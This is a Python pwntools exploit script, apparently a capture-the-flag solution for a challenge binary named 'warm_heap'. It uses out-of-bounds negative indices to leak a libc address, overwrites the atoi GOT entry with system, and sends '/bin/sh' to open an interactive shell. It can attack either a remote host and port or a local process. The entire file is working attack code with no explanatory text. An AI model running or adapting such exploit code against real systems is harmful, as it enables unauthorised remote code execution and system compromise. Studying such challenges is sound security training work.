#!/usr/bin/python
from pwn import *
import sys

HOST = "35.227.33.93"
PORT = 9999

def add(idx, size, content):
    r.sendline("1")
    r.sendlineafter("index: ", str(idx))
    r.sendlineafter("size: ", str(size))
    r.sendlineafter("input: ", content)
    r.recvuntil(">> ")

def edit(idx, content):
    r.sendline("2")
    r.sendlineafter("index: ", str(idx))
    r.sendafter("input: ", content)
    r.recvuntil(">> ")

def view(idx):
    r.sendline("4")
    r.sendlineafter("index: ", str(idx))
    LEAK = r.recvuntil("\n1)", drop=True)
    r.recvuntil(">> ")

    return LEAK

def exploit(r):
    log.info("Fill size array for leaking libc address")

    add(0, 0x602020, "AAAA")   # for libc leak
    add(2, 0x602068, "AAAA")   # for atoi overwrite
    
    LIBCLEAK = u64(view(-12).ljust(8, "\x00"))
    libc.address = LIBCLEAK - libc.symbols["puts"]

    log.info("LIBC leak      : %s" % hex(LIBCLEAK))
    log.info("LIBC           : %s" % hex(libc.address))

    log.info("Overwrite atoi got with system")
    edit(-10, p64(libc.symbols["system"])[:6])

    log.info("Select /bin/sh to trigger shell")
    r.sendline("/bin/sh")

    r.interactive()
    
    return

if __name__ == "__main__":
    e = ELF("./warm_heap")
    libc = ELF("./libc.so.6")

    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
        exploit(r)
    else:       
        r = process("./warm_heap", env={"LD_PRELOAD": "./libc.so.6"})
        print util.proc.pidof(r)
        pause()
        exploit(r)